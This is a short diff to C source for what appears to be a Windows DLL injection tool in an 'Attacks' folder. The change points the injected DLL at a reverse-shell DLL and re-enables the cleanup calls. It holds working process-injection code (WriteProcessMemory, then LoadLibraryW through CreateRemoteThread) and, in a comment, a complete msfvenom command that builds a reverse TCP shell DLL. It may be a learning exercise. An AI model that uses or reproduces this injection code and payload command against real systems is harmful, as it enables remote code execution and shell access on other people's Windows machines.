@@ -18,7 +18,8 @@ int main(int argc, char *argv[]) {
     // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
     // Can test with rundll32.exe reverse.dll,DllMain
     //wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");
-    wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\test.dll");
+    //wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\test.dll");
+    wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\winjection-reverseshelldll.dll");
 
     // Get a PID, error out if improper input for PID
      if(!argv[1] || !(pid=atoi(argv[1]))) {
@@ -35,9 +36,9 @@ int main(int argc, char *argv[]) {
     WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
     PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
     remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
-    //WaitForSingleObject(remoteThread, INFINITE);
-    //VirtualFreeEx(processHandle, remoteBuffer, NULL, MEM_RELEASE);
-    //CloseHandle(processHandle);
+    WaitForSingleObject(remoteThread, INFINITE);
+    VirtualFreeEx(processHandle, remoteBuffer, NULL, MEM_RELEASE);
+    CloseHandle(processHandle);
     
     return 0;
 }
